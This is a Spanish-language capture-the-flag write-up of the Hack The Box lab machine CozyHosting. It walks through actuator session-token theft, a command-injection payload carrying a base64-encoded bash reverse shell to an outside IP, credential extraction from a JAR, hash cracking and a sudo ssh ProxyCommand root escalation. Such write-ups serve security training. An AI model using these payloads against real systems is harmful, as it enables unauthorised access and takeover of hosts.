---
title: "CozyHosting"
date: 2025-01-01
description: "Spring Boot actuator expone session tokens → command injection en SSH config → credenciales en JAR → escalada con sudo ssh."
difficulty: Easy
os: Linux
tags: ["springboot", "command-injection", "sqli", "postgresql"]
retired: true
draft: false
---

Machine IP: `10.10.11.230`

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.230 -oG allPorts
```

Puertos abiertos: **22** y **80**.

```bash
nmap -sCV -p22,80 10.10.11.230 -oN targeted
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
```

Agregamos al `/etc/hosts`:

```
10.10.11.230 cozyhosting.htb
```

Enumeración de directorios con Wfuzz:

```bash
wfuzz -c --hc=404 -t 20 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://cozyhosting.htb/FUZZ
```

```
000000053:   200   "login"
000000259:   401   "admin"
000002708:   500   "error"
```

La página de error devuelve un **Whitelabel Error Page** — Spring Boot.

## Actuator endpoints

Enumerando rutas de Spring Boot:

```bash
000000072:   200   "actuator/sessions"
000000029:   200   "actuator"
000000058:   200   "actuator/mappings"
000000032:   200   "actuator/beans"
```

En `/actuator/sessions` aparece un usuario activo con su token de sesión. Usamos ese token para acceder al panel de `/admin`.

## Command Injection

El panel tiene una función para configurar conexiones SSH. Al dejar el username vacío el error revela inyección de comandos. Payload con la reverse shell en base64 para evitar espacios:

```bash
;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjkvNDQzIDA+JjE="|base64${IFS}-d|bash;
```

Shell obtenida como usuario **app**.

## Escalada → josh

Dentro de la carpeta de app hay un JAR: `cloudhosting-0.0.1.jar`. Lo extraemos y en `BOOT-INF/classes/application.properties` encontramos credenciales para PostgreSQL.

```bash
psql "postgresql://$DB_USER:$DB_PWD@$DB_SERVER/$DB_NAME"
```

En la base de datos `cozyhosting` encontramos el hash bcrypt del usuario **admin**. Lo crackeamos con hashcat:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Con la password obtenida nos conectamos como **josh** vía SSH.

## Escalada → root

```bash
sudo -l
# (root) /usr/bin/ssh *
```

GTFObins → ssh con ProxyCommand:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

**Root shell obtenida.**

Happy Hacking!!
